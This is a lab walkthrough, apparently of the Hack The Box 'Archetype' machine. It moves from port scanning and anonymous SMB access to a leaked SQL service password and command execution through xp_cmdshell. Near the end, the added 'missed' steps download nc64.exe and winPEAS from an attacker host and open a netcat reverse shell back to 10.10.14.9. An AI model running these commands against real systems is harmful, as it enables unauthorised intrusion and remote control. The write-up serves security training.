hint: use Impacket tool 

basic scan
```bash
nmap -p- 10.129.107.37 -sV -sC
```
taking forever so took out -p-
```bash
nmap  --min-rate 1000 10.129.107.37 -sV -sC
```
output:
```bash
Nmap scan report for 10.129.107.37
Host is up (0.28s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-03-22T07:07:58
|_Not valid after:  2055-03-22T07:07:58
|_ssl-date: 2025-03-22T07:25:08+00:00; -1s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-22T07:25:04
|_  start_date: N/A
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.63 seconds
```


```bash
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
```
try to enumerate smb
```bash
smbclient.py guest@10.129.107.37
empty password
```

output:
```bash
Type help for list of commands
# help
 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 lls {dirname} - lists all the files on the local filesystem.
 tree {filepath} - recursively lists all files in folder and sub folders
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)
```

listing available shares access denied..
```bash
# shares
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# 
```

google searched and trying anonymous login with `''`
```bash
# login ''
Password:
[*] GUEST Session Granted
# ls
[-] No share selected
# shares
ADMIN$
backups
C$
IPC$


# use ADMIN$
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use backups
# ls
drw-rw-rw-          0  Mon Jan 20 21:20:57 2020 .
drw-rw-rw-          0  Mon Jan 20 21:20:57 2020 ..
-rw-rw-rw-        609  Mon Jan 20 21:23:18 2020 prod.dtsConfig
# get prod.dtsConfig
```

output of prod.dtsConfig
```bash
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>%                                                                 
```

login info obtained , hardcoded on dtsjconfig
`Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc`
maybe it is sql related credentials

```bash
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.107.37
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Encryption required, switching to TLS
[-] ERROR(ARCHETYPE): Line 1: Login failed for user 'sql_svc'.
```

using windows-auth flag seems to work
```bash
 @cozyty  mssqlclient.py sql_svc:M3g4c0rp123@10.129.107.37 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

info:
```
The -windows-auth flag is important when connecting to Microsoft SQL Server because it specifies which authentication mechanism to use.
SQL Server supports two authentication modes:

SQL Authentication:

Uses credentials stored directly in SQL Server
Username and password are validated against the SQL Server's own user database
Doesn't depend on Windows accounts


Windows Authentication (also called Integrated Security):

Uses Windows domain or local machine credentials
Authentication is handled by Windows, not SQL Server
Often preferred in enterprise environments for centralized account management
```

enum seems interesting...
```
SQL (ARCHETYPE\sql_svc  dbo@master)> help
    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query




SQL (ARCHETYPE\sql_svc  dbo@master)> enum_db
[%] select name, is_trustworthy_on from sys.databases
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1



SQL (ARCHETYPE\sql_svc  dbo@master)> enum_links
[%] EXEC sp_linkedservers
SRV_NAME    SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
---------   ----------------   -----------   --------------   ------------------   ------------   -------   
ARCHETYPE   SQLNCLI            SQL Server    ARCHETYPE        NULL                 NULL           NULL      
[%] EXEC sp_helplinkedsrvlogin
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
ARCHETYPE       NULL                        1   NULL



SQL (ARCHETYPE\sql_svc  dbo@master)> enum_logins
[%] select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin from  master.sys.server_principals r left join master.sys.syslogins sl on sl.sid = r.sid where r.type in ('S','E','X','U','G')
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                                  SQL_LOGIN                 1          1               0             0            0              0           0           0           0   
##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
ARCHETYPE\sql_svc                   WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0




SQL (ARCHETYPE\sql_svc  dbo@master)> enum_users
[%] EXEC sp_helpuser
UserName                            RoleName   LoginName                           DefDBName   DefSchemaName       UserID                                                                   SID   
---------------------------------   --------   ---------------------------------   ---------   -------------   ----------   -------------------------------------------------------------------   
##MS_AgentSigningCertificate##      public     ##MS_AgentSigningCertificate##      master      NULL            b'6         '   b'01060000000000090100000014996a2fb6d6ef7960d6ad52ac60318368179ae7'   
##MS_PolicyEventProcessingLogin##   public     ##MS_PolicyEventProcessingLogin##   master      dbo             b'5         '                                   b'b358f79fa0d32a4e9087d7897f494f6a'   
dbo                                 db_owner   sa                                  master      dbo             b'1         '                                                                 b'01'   
guest                               public     NULL                                NULL        guest           b'2         '                                                                 b'00'   
INFORMATION_SCHEMA                  public     NULL                                NULL        NULL            b'3         '                                                                  NULL   
sys                                 public     NULL                                NULL        NULL            b'4         '                                                                  NULL   
```



sql outputs:
```bash
SQL (ARCHETYPE\sql_svc  dbo@msdb)> use master
[%] use master
ENVCHANGE(DATABASE): Old Value: msdb, New Value: master
INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT name FROM sys.tables
[%] SELECT name FROM sys.tables
name                    
---------------------   
spt_fallback_db         
spt_fallback_dev        
spt_fallback_usg        
spt_monitor             
MSreplication_options   
SQL (ARCHETYPE\sql_svc  dbo@master)> use tempdb
[%] use tempdb
ENVCHANGE(DATABASE): Old Value: master, New Value: tempdb
INFO(ARCHETYPE): Line 1: Changed database context to 'tempdb'.
^[[ASQL (ARCHETYPE\sql_svc  dbo@tempdb)> SELECT name FROM sys.tables
[%] SELECT name FROM sys.tables
name        
---------   
#A4C4CDDB   
SQL (ARCHETYPE\sql_svc  dbo@tempdb)> select * from #A4C4CDDB
[%] select * from #A4C4CDDB
ERROR(ARCHETYPE): Line 1: Invalid object name '#A4C4CDDB'.
SQL (ARCHETYPE\sql_svc  dbo@tempdb)> SELECT * FROM #A4C4CDDB
[%] SELECT * FROM #A4C4CDDB
ERROR(ARCHETYPE): Line 1: Invalid object name '#A4C4CDDB'.
SQL (ARCHETYPE\sql_svc  dbo@tempdb)> SELECT name FROM sys.tables
[%] SELECT name FROM sys.tables
name        
---------   
#A4C4CDDB   
SQL (ARCHETYPE\sql_svc  dbo@tempdb)> SELECT * FROM A4C4CDDB
[%] SELECT * FROM A4C4CDDB
ERROR(ARCHETYPE): Line 1: Invalid object name 'A4C4CDDB'.
SQL (ARCHETYPE\sql_svc  dbo@tempdb)> use model
[%] use model
ENVCHANGE(DATABASE): Old Value: tempdb, New Value: model
INFO(ARCHETYPE): Line 1: Changed database context to 'model'.
SQL (ARCHETYPE\sql_svc  dbo@model)> SELECT name FROM sys.tables
[%] SELECT name FROM sys.tables
name   
----   
SQL (ARCHETYPE\sql_svc  dbo@model)> use msdb
[%] use msdb
ENVCHANGE(DATABASE): Old Value: model, New Value: msdb
INFO(ARCHETYPE): Line 1: Changed database context to 'msdb'.
SQL (ARCHETYPE\sql_svc  dbo@msdb)> SELECT name FROM sys.tables
[%] SELECT name FROM sys.tables
name                                                        
---------------------------------------------------------   
systaskids                                                  
syscachedcredentials                                        
syscollector_blobs_internal                                 
syspolicy_system_health_state_internal                      
sysutility_mi_volumes_stage_internal                        
syscollector_tsql_query_collector                           
sysutility_ucp_aggregated_dac_health_internal               
syspolicy_policy_execution_history_internal                 
sysutility_mi_cpu_stage_internal                            
sysmanagement_shared_server_groups_internal                 
sysssispackages                                             
syspolicy_policy_execution_history_details_internal         
sysmanagement_shared_registered_servers_internal            
sysssispackagefolders                                       
sysssislog                                                  
sysutility_ucp_aggregated_mi_health_internal                
syspolicy_execution_internal                                
sysutility_mi_smo_stage_internal                            
sysutility_mi_smo_objects_to_collect_internal               
sysutility_mi_smo_properties_to_collect_internal            
syspolicy_configuration_internal                            
log_shipping_primary_databases                              
syspolicy_management_facets                                 
syspolicy_facet_events                                      
msdb_version                                                
syscollector_config_store_internal                          
sysutility_ucp_dac_health_internal                          
sysmail_profile                                             
MSdbms                                                      
log_shipping_primary_secondaries                            
syspolicy_conditions_internal                               
MSdbms_datatype                                             
log_shipping_monitor_primary                                
log_shipping_monitor_history_detail                         
sysmail_principalprofile                                    
log_shipping_monitor_error_detail                           
MSdbms_map                                                  
log_shipping_secondary                                      
sysutility_ucp_supported_object_types_internal              
log_shipping_secondary_databases                            
sysmaintplan_subplans                                       
sysutility_ucp_managed_instances_internal                   
log_shipping_monitor_secondary                              
sysmail_account                                             
log_shipping_monitor_alert                                  
sysutility_ucp_mi_health_internal                           
sysdac_instances_internal                                   
syscollector_collection_sets_internal                       
sysmaintplan_log                                            
sysmail_profileaccount                                      
sysutility_ucp_processing_state_internal                    
syspolicy_policy_categories_internal                        
sysdac_history_internal                                     
MSdbms_datatype_mapping                                     
sysmaintplan_logdetail                                      
sysmail_servertype                                          
syspolicy_object_sets_internal                              
sysutility_ucp_health_policies_internal                     
sysmail_server                                              
sysutility_ucp_filegroups_with_policy_violations_internal   
sysutility_ucp_policy_check_conditions_internal             
sysdbmaintplans                                             
syscollector_collector_types_internal                       
syspolicy_policies_internal                                 
sysutility_ucp_policy_target_conditions_internal            
sysutility_ucp_policy_violations_internal                   
sysmail_configuration                                       
sysdbmaintplan_jobs                                         
sysmail_mailitems                                           
external_libraries_installed                                
sysdbmaintplan_databases                                    
sysutility_ucp_configuration_internal                       
sysproxies                                                  
syssubsystems                                               
syscollector_collection_items_internal                      
sysdbmaintplan_history                                      
sysproxysubsystem                                           
sysproxylogin                                               
sysutility_ucp_dacs_stub                                    
sysutility_ucp_volumes_stub                                 
sqlagent_info                                               
sysutility_ucp_computers_stub                               
sysdownloadlist                                             
sysutility_ucp_smo_servers_stub                             
sysjobhistory                                               
sysutility_ucp_databases_stub                               
sysoriginatingservers                                       
sysutility_ucp_filegroups_stub                              
sysutility_ucp_datafiles_stub                               
dm_hadr_automatic_seeding_history                           
sysutility_ucp_logfiles_stub                                
sysutility_ucp_cpu_utilization_stub                         
autoadmin_task_agents                                       
sysmail_attachments                                         
autoadmin_managed_databases                                 
sysutility_ucp_space_utilization_stub                       
sysjobs                                                     
backupmediaset                                              
autoadmin_task_agent_metadata                               
sysmail_send_retries                                        
sysjobservers                                               
backupmediafamily                                           
syssessions                                                 
syscollector_execution_log_internal                         
smart_backup_files                                          
sysjobactivity                                              
backupset                                                   
sysmail_log                                                 
autoadmin_system_flags                                      
sysjobsteps                                                 
syscollector_execution_stats_internal                       
autoadmin_master_switch                                     
backupfilegroup                                             
sysjobstepslogs                                             
sysutility_ucp_mi_file_space_health_internal                
syspolicy_target_sets_internal                              
backupfile                                                  
sysmail_query_transfer                                      
sysschedules                                                
restorehistory                                              
syspolicy_target_set_levels_internal                        
sysmail_attachments_transfer                                
sysutility_ucp_mi_database_health_internal                  
restorefile                                                 
restorefilegroup                                            
sysjobschedules                                             
logmarkhistory                                              
sysutility_ucp_dac_file_space_health_internal               
sysutility_mi_configuration_internal                        
suspect_pages                                               
syscategories                                               
systargetservers                                            
log_shipping_primaries                                      
sysutility_ucp_mi_volume_space_health_internal              
sysutility_mi_dac_execution_statistics_internal             
systargetservergroups                                       
log_shipping_secondaries                                    
systargetservergroupmembers                                 
syspolicy_policy_category_subscriptions_internal            
sysalerts                                                   
sysutility_ucp_computer_cpu_health_internal                 
sysutility_mi_session_statistics_internal                   
sysoperators                                                
sysnotifications                                            
sysutility_ucp_snapshot_partitions_internal
```


syscachedcredentials seems interesting..
```
SQL (ARCHETYPE\sql_svc  dbo@msdb)> SELECT * FROM syscachedcredentials
[%] SELECT * FROM syscachedcredentials
login_name   has_server_access   is_sysadmin_member   cachedate   
----------   -----------------   ------------------   ---------   
```
nothing


hint 
`search Transact sql shell for Microsoft SQL Server`



```bash
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'pwd'; 
[%] EXEC xp_cmdshell 'pwd';
output                                                        
-----------------------------------------------------------   
'pwd' is not recognized as an internal or external command,   
operable program or batch file.                               
NULL                                                          
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'dir C:\'; 
[%] EXEC xp_cmdshell 'dir C:\';
output                                                       
----------------------------------------------------------   
 Volume in drive C has no label.                             
 Volume Serial Number is 9565-0B4F                           
NULL                                                         
 Directory of C:\                                            
NULL                                                         
01/20/2020  05:20 AM    <DIR>          backups               
07/27/2021  02:28 AM    <DIR>          PerfLogs              
07/27/2021  03:20 AM    <DIR>          Program Files         
07/27/2021  03:20 AM    <DIR>          Program Files (x86)   
01/19/2020  11:39 PM    <DIR>          Users                 
07/27/2021  03:22 AM    <DIR>          Windows               
               0 File(s)              0 bytes                
               6 Dir(s)  10,715,136,000 bytes free           
NULL                                                         
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'dir C:\Users'; 
[%] EXEC xp_cmdshell 'dir C:\Users';
output                                                 
----------------------------------------------------   
 Volume in drive C has no label.                       
 Volume Serial Number is 9565-0B4F                     
NULL                                                   
 Directory of C:\Users                                 
NULL                                                   
01/19/2020  04:10 PM    <DIR>          .               
01/19/2020  04:10 PM    <DIR>          ..              
01/19/2020  11:39 PM    <DIR>          Administrator   
01/19/2020  11:39 PM    <DIR>          Public          
01/20/2020  06:01 AM    <DIR>          sql_svc         
               0 File(s)              0 bytes          
               5 Dir(s)  10,715,136,000 bytes free     
NULL                                                   
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'dir C:\Users\sql_svc'; 
[%] EXEC xp_cmdshell 'dir C:\Users\sql_svc';
output                                               
--------------------------------------------------   
 Volume in drive C has no label.                     
 Volume Serial Number is 9565-0B4F                   
NULL                                                 
 Directory of C:\Users\sql_svc                       
NULL                                                 
01/20/2020  06:01 AM    <DIR>          .             
01/20/2020  06:01 AM    <DIR>          ..            
01/20/2020  06:01 AM    <DIR>          3D Objects    
01/20/2020  06:01 AM    <DIR>          Contacts      
01/20/2020  06:42 AM    <DIR>          Desktop       
01/20/2020  06:01 AM    <DIR>          Documents     
01/20/2020  06:01 AM    <DIR>          Downloads     
01/20/2020  06:01 AM    <DIR>          Favorites     
01/20/2020  06:01 AM    <DIR>          Links         
01/20/2020  06:01 AM    <DIR>          Music         
01/20/2020  06:01 AM    <DIR>          Pictures      
01/20/2020  06:01 AM    <DIR>          Saved Games   
01/20/2020  06:01 AM    <DIR>          Searches      
01/20/2020  06:01 AM    <DIR>          Videos        
               0 File(s)              0 bytes        
              14 Dir(s)  10,715,136,000 bytes free   
NULL                                                 
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop'; 
[%] EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop';
output                                               
--------------------------------------------------   
 Volume in drive C has no label.                     
 Volume Serial Number is 9565-0B4F                   
NULL                                                 
 Directory of C:\Users\sql_svc\Desktop               
NULL                                                 
01/20/2020  06:42 AM    <DIR>          .             
01/20/2020  06:42 AM    <DIR>          ..            
02/25/2020  07:37 AM                32 user.txt      
               1 File(s)             32 bytes        
               2 Dir(s)  10,715,136,000 bytes free   
NULL                                                 
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt'; 
[%] EXEC xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt';
output                             
--------------------------------   
3e7b102e78218e935bf3f4951fec21a3   
SQL (ARCHETYPE\sql_svc  dbo@msdb)>
```

flag got it 3e7b102e78218e935bf3f4951fec21a3



things that I missed...
```
As a first step we need to check what is the role we have in the server. We will use the command found in
the above cheatsheet:
SELECT is_srvrolemember('sysadmin');
The output is 1 , which translates to True .
In previous cheatsheets, we found also how to set up the command execution through the xp_cmdshell :
First it is suggested to check if the xp_cmdshell is already activated by issuing the first command:
EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv
SQL> EXEC xp_cmdshell 'net user';
```


also missed downloading netcat64 for windows, 
then 
```bash
sudo python3 -m http.server 80
sudo nc -lvnp 443
#upload nc to windows
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://10.10.14.9/nc64.exe -outfile nc64.exe"

#then bind windows cmd to nc
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
10.10.14.9 443"

#upload peas
powershell
wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
#execute
PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
```
